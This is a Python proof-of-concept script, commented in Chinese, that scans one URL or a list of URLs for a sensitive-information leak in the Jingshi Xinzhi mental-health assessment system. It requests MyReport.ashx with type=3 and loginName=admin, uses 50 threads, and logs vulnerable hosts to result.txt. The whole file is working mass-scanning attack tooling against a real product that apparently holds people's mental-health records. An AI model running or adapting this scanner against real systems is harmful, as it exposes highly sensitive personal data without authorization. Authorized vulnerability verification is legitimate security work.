#京师心智心理健康测评系统MyReport.ashx敏感信息泄露
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="京师心智心理健康测评系统MyReport.ashx敏感信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/FunctionModular/PersonalReport/Ajax/MyReport.ashx?type=3&loginName=admin'
    url = target+payload
    headers = {
        'Accept':'*/*',
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Connection':'close',   
         }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }


    try:
        re = requests.get(url=url,headers=headers,verify=False,timeout=20)
        if re.status_code == 200 and '"_AddFiletemplate"' in re.text:
            print(f'[+++]该{target}存在京师心智心理健康测评系统MyReport.ashx敏感信息泄露')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
    main()